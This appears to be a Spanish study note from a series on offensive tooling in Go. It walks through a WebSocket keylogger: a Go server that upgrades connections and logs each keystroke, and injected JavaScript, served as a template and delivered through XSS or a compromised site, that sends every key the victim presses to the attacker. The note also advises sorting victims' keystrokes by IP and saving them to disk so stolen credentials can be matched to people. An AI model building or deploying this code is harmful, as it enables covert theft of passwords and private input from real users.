---
tags:
  - Go
  - Go/HTTP
  - WebSockets
Fecha de actualización: 2026-07-24
Nota previa: "[[02 - Plantillas HTML y credential harvesting]]"
Nota siguiente: "[[04 - Multiplexar Command-and-Control]]"
Area: "[[Servidores HTTP.base|Servidores HTTP]]"
---
---

La variante en tiempo real del credential harvester: en vez de esperar al `submit` del formulario, capturas **cada tecla** según se pulsa. Un pequeño JavaScript abre un WebSocket contra tu servidor Go y le manda las pulsaciones. El vector de entrada del JS es un XSS en la aplicación víctima o un servidor web ya comprometido — la explotación del XSS vive en Red Team ([[XSS.base|XSS]]); aquí, la infraestructura en Go que recibe las teclas.

## WebSockets en Go: elegir librería

<mark style="background: #ADCCFFA6;">El WebSocket es un canal full-duplex sobre una conexión HTTP "promocionada"</mark>: una vez establecido, el servidor puede empujar datos al cliente sin *polling*. Go **no** trae WebSockets en la stdlib, así que usas una librería. El libro usa `gorilla/websocket`; sigue siendo válida (el toolkit gorilla fue archivado en 2022 y luego revivido), pero para tooling nuevo conviene **`coder/websocket`** (antes `nhooyr.io/websocket`): API *context-native*, más limpia y mantenida.

El paso clave es "promocionar" (upgrade) la petición HTTP a WebSocket. Con gorilla:

```go
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },   // acepta cualquier origen
}
```

> [!warning]+ `CheckOrigin: return true` es un agujero
> Aceptar **cualquier** origen abre la puerta a *Cross-Site WebSocket Hijacking* (CSWSH): otra web podría abrir un WS contra tu servidor. En este ataque tú controlas ambos extremos (el JS lo inyectas tú), así que "cuela", pero <mark style="background: #FF5582A6;">en cualquier servidor real restringe el origen a tu dominio</mark>. `coder/websocket` lo pone fácil con `OriginPatterns`.

## El servidor: upgrade y leer teclas

Tras el upgrade, lees mensajes en bucle hasta que el cliente se va. Cada mensaje es una tecla:

```go
func serveWS(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)   // HTTP -> WebSocket
    if err != nil {
        return
    }
    defer conn.Close()
    client := conn.RemoteAddr().String()
    for {
        _, msg, err := conn.ReadMessage()
        if err != nil {
            return                              // cliente desconectado
        }
        slog.Info("keystroke", "client", client, "key", string(msg))
    }
}
```

## El JavaScript inyectado

El JS que corre en la víctima abre el WebSocket y reenvía cada `keypress`. Se sirve como una **plantilla** `html/template` para inyectarle la dirección de tu servidor (el truco de servir `logger.js` bajo la ruta `k.js`):

```javascript
(function() {
    const conn = new WebSocket("wss://{{.}}/ws");   // {{.}} lo rellena el servidor Go
    document.addEventListener("keydown", (e) => {
        conn.send(e.key);   // e.key (moderno) — `onkeypress` y `e.which` están deprecados
    });
})();
```

```go
func serveJS(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/javascript")
    jsTemplate.Execute(w, wsAddr)   // interpola la dirección del WebSocket en {{.}}
}
```

<mark style="background: #8000E1A6;">La página víctima solo necesita un `<script src="https://tu-server/k.js">`</mark>; el resto (abrir el WS, capturar teclas, exfiltrar) lo monta tu servidor al renderizar la plantilla.

## Modernizar y mejorar

Sobre el código del libro:

- **`coder/websocket`** en vez de gorilla para código nuevo: `websocket.Accept(w, r, opts)` devuelve una `*Conn` cuyas operaciones toman `context`, así que un timeout o una cancelación cortan la lectura limpiamente:

```go
c, err := websocket.Accept(w, r, &websocket.AcceptOptions{
    OriginPatterns: []string{"target.com"},   // restringe el origen (evita CSWSH)
})
```

- **Fuera el `init()`**: el libro parsea flags y la plantilla en un `init()`. Es un anti-patrón (corre implícito, no puede devolver error, complica los tests); hazlo explícito en `main`.
- **`slog` por cliente a fichero**: el libro imprime a stdout y mezcla las teclas de varias víctimas. <mark style="background: #FFB86CA6;">Agrupa por cliente (IP:puerto) y persiste a disco</mark>, o perderás la sesión al cerrar el terminal y no sabrás qué credencial es de quién.
- **`http.Server` con timeouts** (nota [[00 - Servidor HTTP con net-http]]) — pero ojo: un WebSocket es de larga duración, así que el `WriteTimeout`/`ReadTimeout` del servidor no debe cortar la conexión persistente; se gestiona el timeout a nivel de mensaje con `context`.

El último tema del capítulo abandona la captura y monta infraestructura de C2: un servidor que multiplexa varias conexiones de mando y control → [[04 - Multiplexar Command-and-Control]].
